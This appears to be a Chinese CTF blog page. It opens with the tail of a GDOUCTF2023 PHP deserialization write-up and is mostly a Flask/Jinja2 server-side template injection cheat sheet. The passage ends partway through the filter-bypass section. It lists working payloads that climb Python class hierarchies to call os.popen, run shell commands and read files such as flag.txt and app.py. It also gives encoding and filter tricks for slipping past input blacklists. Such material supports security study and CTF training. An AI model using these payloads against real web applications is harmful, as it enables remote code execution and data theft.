class="string">&#x27;department&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>(<span class="string">&#x27;one class&#x27;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>(<span class="variable">$b</span>, <span class="string">&#x27;ong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>这里要利用到<strong>php原生类</strong> SplFileObject，可以读取文件内容，但只能输出一行   没办法输出flag</p>
<p>需要结合php伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>php原生类可参考：<a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/10/23/GDOUCTF2023-reverseClock-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/20/ssti/" >SSTI模板注入</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-20
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1" alt="img"></p>
<h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h3 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125; <span class="comment"># 控制结构</span></span><br><span class="line">&#123;&#123; &#125;&#125; <span class="comment"># 变量表示符</span></span><br><span class="line">&#123;<span class="comment"># #&#125; # 注释</span></span><br></pre></td></tr></table></figure>

<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="literal">None</span>&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure>

<h4 id="url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等"><a href="#url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等" class="headerlink" title="url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等"></a>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
<p>例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__        <span class="comment"># 返回调用的参数类型</span></span><br><span class="line">__base__         <span class="comment"># 以字符串返回一个类所直接继承的第一个类，一般情况下是object</span></span><br><span class="line">__bases__        <span class="comment"># 以元组的形式返回基类</span></span><br><span class="line">__mro__          <span class="comment"># 返回解析方法调用的顺序</span></span><br><span class="line">__subclasses__() <span class="comment"># 返回子类列表</span></span><br><span class="line">__globals__      <span class="comment"># 以字典的形式返回函数所在的全局命名空间所定义的全局变量</span></span><br><span class="line"><span class="built_in">__import__</span>       <span class="comment"># 导入模块</span></span><br><span class="line">__builtins__     <span class="comment"># 内建模块的引用，在任何地方都是可见的(包括全局)，这个模块包括了很多强大的内置函数，如eval, exec, fopen等</span></span><br><span class="line">__getitem__      <span class="comment"># 提取元素</span></span><br></pre></td></tr></table></figure>

<h3 id="常规逃逸"><a href="#常规逃逸" class="headerlink" title="常规逃逸"></a>常规逃逸</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">80</span>][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>, <span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;click.utils.LazyFile&#x27;&gt;</span></span><br><span class="line"><span class="comment">## 命令执行</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">475</span>).__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">## 读文件</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">475</span>)(<span class="string">&#x27;flag.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块</span></span><br><span class="line">lipsum.__globals__.get(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>flask提供了两个内置的全局函数：<code>url_for、get_flashed_messages</code>，两个都有<code>__globals__</code>键；</p>
<p>jinja2一共有3个内置的全局函数：<code>range、lipsum、dict</code>，其中只有lipsum有<code>__globals__</code>键</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>flask的内置函数只有flask的渲染方法render_template()和render_template_string()渲染时才可使用；</p>
<p>jinja2的内置函数无条件，flask和jinja2的渲染方法都可使用</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flask</span></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># jinja2</span></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 另外两个内置函数和正常逃逸一个思路</span></span><br></pre></td></tr></table></figure>

<h3 id="内置类-Undefined"><a href="#内置类-Undefined" class="headerlink" title="内置类 Undefined"></a>内置类 Undefined</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>在渲染<code>().__class__.__base__.__subclasses__().c.__init__</code>初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了<strong>Undefined</strong>类型，渲染结果显示为<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，所以看起来并不存在的c类实际上触发了内置的<strong>Undefined</strong>类型。</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;C:\Windows\win.ini&quot;</span>).read()</span><br><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串。</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[__class__]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;&quot;</span>.encode().fromhex(<span class="string">&quot;5f5f636c6173735f5f&quot;</span>).decode()]</span><br></pre></td></tr></table></figure>

<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="字符串过滤"><a href="#字符串过滤" class="headerlink" title="字符串过滤"></a>字符串过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串拼接</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cl&quot;</span>+<span class="string">&quot;ass__&quot;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cl&quot;</span><span class="string">&quot;ass__&quot;</span>]</span><br><span class="line"><span class="comment"># 字符串倒序</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>

<h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过.</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class__&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line"><span class="comment"># 绕过[]</span></span><br><span class="line">__subclasses__().pop(<span class="number">40</span>) == __subclasses__()[<span class="number">40</span>]</span><br><span class="line">__subclasses__().__getitem__(<span class="number">40</span>) == __subclasses__()[<span class="number">40</span>]</span><br><span class="line"><span class="comment"># 绕过\&#123;\&#123;</span></span><br><span class="line">&#123;%<span class="built_in">print</span>()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment"># 也可以使用 &#123;% if ... %&#125;1&#123;% endif %&#125; 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来：</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls /&#x27;</span>) %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment"># 也可以用 &#123;%print(......)%&#125; 的形式来代替 &#123;&#123; ，如下：</span></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下皆为 &quot;&quot;[&quot;__class__&quot;] 等效形式</span></span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>]</span><br><span class="line"><span class="comment"># Unicode</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="request方法"><a href="#request方法" class="headerlink" title="request方法"></a>request方法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数传递(GET|POST都可)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.values.x1]</span><br><span class="line"><span class="comment"># GET方法传参</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[request.args.x1]&#125;&#125;&amp;x1=__class__</span><br><span class="line"><span class="comment"># POST方法传参</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.form.x1]</span><br><span class="line">	POST: x1=__class__</span><br><span class="line"><span class="comment"># headers头</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.headers.x1]</span><br><span class="line">	x1: __class__</span><br><span class="line"><span class="comment"># User-Agent</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.user_agent.string]</span><br><span class="line">	User-Agent: __class__</span><br><span class="line"><span class="comment"># Cookie</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.cookies.x1]</span><br><span class="line">	Cookie: x1=__class__</span><br></pre></td></tr></table></figure>

<h4 id="使用-JinJa-的过滤器进行Bypass"><a href="#使用-JinJa-的过滤器进行Bypass" class="headerlink" title="使用 JinJa 的过滤器进行Bypass"></a>使用 JinJa 的过滤器进行Bypass</h4><p>在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。</p>
<p>详情请看官方文档：<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#filters">https://jinja.palletsprojects.com/en/latest/templates/#filters</a></p>
<p>以下是内置的所有的过滤器列表：</p>
<table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#abs"><code>abs()</code></a></th>
<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#float"><code>float()</code></a></th>
<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#lower"><code>lower()</code></a></th>
<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#round"><code>round()</code></a></th>
<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#tojson"><code>tojson()</code></a></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#attr"><code>attr()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#forceescape"><code>forceescape()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#map"><code>map()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#safe"><code>safe()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#trim"><code>trim()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#batch"><code>batch()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#format"><code>format()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#max"><code>max()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#select"><code>select()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#truncate"><code>truncate()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#capitalize"><code>capitalize()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#groupby"><code>groupby()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#min"><code>min()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#selectattr"><code>selectattr()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#unique"><code>unique()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#center"><code>center()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#indent"><code>indent()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#pprint"><code>pprint()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#slice"><code>slice()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#upper"><code>upper()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#default"><code>default()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#int"><code>int()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#random"><code>random()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#sort"><code>sort()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#urlencode"><code>urlencode()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#dictsort"><code>dictsort()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#join"><code>join()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#reject"><code>reject()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#string"><code>string()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#urlize"><code>urlize()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#escape"><code>escape()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#last"><code>last()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#rejectattr"><code>rejectattr()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#striptags"><code>striptags()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#wordcount"><code>wordcount()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#filesizeformat"><code>filesizeformat()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#length"><code>length()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#replace"><code>replace()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#sum"><code>sum()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#wordwrap"><code>wordwrap()</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#first"><code>first()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#list"><code>list()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#reverse"><code>reverse()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#title"><code>title()</code></a></td>
<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#xmlattr"><code>xmlattr()</code></a></td>
</tr>
</tbody></table>
<p>可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。</p>
<h5 id="常用字符获取入口点"><a href="#常用字符获取入口点" class="headerlink" title="常用字符获取入口点"></a>常用字符获取入口点</h5><ul>
<li>对于获取一般字符的方法有以下几种：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如下演示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过 <code>&lt;generator object select_or_reject at 0x7fe339298fc0&gt;</code> 字符串获取的字符有：尖号、字母、空格、下划线和数字。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过 <code>&lt;TemplateReference None&gt;</code> 字符串获取的字符有：尖号、字母和空格。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符，这个在下面第二道题中会讲到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可获得到的字符更多了。</p>
<ul>
<li>对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：</li>
</ul>
